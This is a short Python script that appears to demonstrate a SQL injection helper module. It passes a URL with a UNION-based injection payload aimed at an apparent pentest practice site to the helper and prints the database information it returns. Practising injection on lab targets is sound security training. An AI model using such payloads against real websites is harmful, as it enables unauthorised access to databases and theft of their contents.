from modules import Sqli

SqliHelper = Sqli("http://pentest.justhumanz.me/sqli/example1.php?name=root' and 0 union select 1,*,3,4,5-- -")

informations = SqliHelper.information()
print(informations)
